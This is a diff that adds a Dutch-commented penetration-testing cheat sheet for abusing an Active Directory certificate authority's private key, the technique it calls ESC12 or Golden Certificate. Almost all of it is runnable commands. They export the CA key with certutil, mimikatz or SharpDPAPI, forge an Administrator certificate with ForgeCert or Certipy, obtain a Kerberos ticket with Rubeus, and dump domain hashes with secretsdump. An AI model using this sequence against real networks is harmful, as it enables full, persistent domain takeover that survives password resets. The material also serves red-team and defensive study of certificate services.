@@ -1,0 +1,36 @@
+# AD CS ESC12 - Shell Access to CA Server (YOLO / CA Key Abuse)
+# Aanvaller heeft shell/RDP toegang tot de CA server zelf
+# De CA private key staat op het bestandssysteem of is via DPAPI te exporteren
+# Vereist: fysieke/RDP/shell toegang tot de CA server
+# Stap 1: Controleer of de CA key exportable is opgeslagen
+certutil -store My
+# Zoek naar het CA certificaat — noteer de Serial Number en Thumbprint
+# Check of key op disk staat (niet op HSM):
+certutil -verifykeys
+# "CertUtil: -verifykeys command completed successfully" = key is lokaal beschikbaar
+# Stap 2: Exporteer de CA private key
+# Via certutil:
+certutil -exportPFX -p "ExportPassword123!" My CA_THUMBPRINT ca-key.pfx
+# Via mimikatz (als certutil geblokkeerd is):
+mimikatz# crypto::capi
+mimikatz# crypto::certificates /export /systemstore:LOCAL_MACHINE
+# Via DPAPI als de key beschermd is:
+mimikatz# dpapi::capi /in:"C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\KEYFILE"
+# SharpDPAPI:
+.\SharpDPAPI.exe certificates /machine
+# Stap 3: Gebruik de CA key om zelf certificaten te signen (Golden Certificate / ForgeCert)
+# ForgeCert:
+.\ForgeCert.exe --CaCertPath ca-key.pfx --CaCertPassword ExportPassword123! --Subject "CN=Administrator,CN=Users,DC=domain,DC=local" --SubjectAltName Administrator@domain.local --NewCertPath admin-forged.pfx --NewCertPassword Password123!
+# Via Certipy:
+certipy forge -ca-pfx ca-key.pfx -upn Administrator@domain.local -subject "CN=Administrator,CN=Users,DC=domain,DC=local"
+# Stap 4: Authenticate met het vervalste certificaat
+.\Rubeus.exe asktgt /user:Administrator /certificate:admin-forged.pfx /password:Password123! /ptt
+# Of via Certipy:
+certipy auth -pfx administrator_forged.pfx -dc-ip DC_IP
+# Stap 5: DCSync of lateral movement
+impacket-secretsdump -hashes :NTHASH domain.local/Administrator@dc01.domain.local
+# Tip: Dit is de ultieme ADCS aanval — met de CA key kun je ELKE identiteit forgen
+# Tip: Vereist fysieke/RDP/shell toegang tot de CA server, niet remote exploitable
+# Tip: Golden Certificate is vergelijkbaar met Golden Ticket maar dan via PKI
+# Tip: Vervalste certs zijn geldig zolang de CA trusted is — overleeft password resets
+# Tip: Check of CA key op HSM staat (certutil -store toont "Provider = Microsoft Software Key Storage Provider" = GEEN HSM)
